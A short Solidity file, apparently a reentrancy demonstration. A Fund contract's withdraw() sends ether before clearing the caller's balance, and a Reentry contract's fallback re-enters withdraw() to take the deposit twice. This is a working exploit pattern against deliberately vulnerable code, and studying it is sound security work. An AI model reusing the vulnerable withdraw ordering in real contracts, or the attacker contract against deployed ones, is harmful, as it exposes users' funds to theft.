// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.0 <0.8.0;

contract Fund {
    mapping(address => uint) shares;
    
    function getBalance() public view returns (uint balance) {
        balance = (address)(this).balance;
    }
    
    function getClientBalance() public view returns (uint balance) {
        balance = shares[msg.sender];
    }
    
    function deposit() public payable {
        shares[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        //msg.sender.transfer(shares[msg.sender]);
        //shares[msg.sender] = 0;
        msg.sender.call{value:shares[msg.sender]}("");
        shares[msg.sender] = 0;
    }
}

contract Reentry {
    
    Fund fund;
    uint8 fallbacked;
    
    function getBalance() public view returns (uint balance) {
        balance = (address)(this).balance;
    }
    
    function getFundBalance() public view returns (uint balance) {
        balance = fund.getClientBalance();
    }
    
    function setFund(Fund addr) public payable {
        fund = addr;
    }
    
    function depositOnce(uint value) public {
        fund.deposit{value: value}();
    }
    
    function withdrawTwice() public {
        fund.withdraw();
    }
    
    //receive() external payable { if (fallbacked == 0) {
         //   fallbacked = 1;
    //        fund.withdraw();      
    //    }}
    
    fallback() external payable {
        if (fallbacked == 0) {
            fallbacked = 1;
            fund.withdraw();      
        }
    }
}
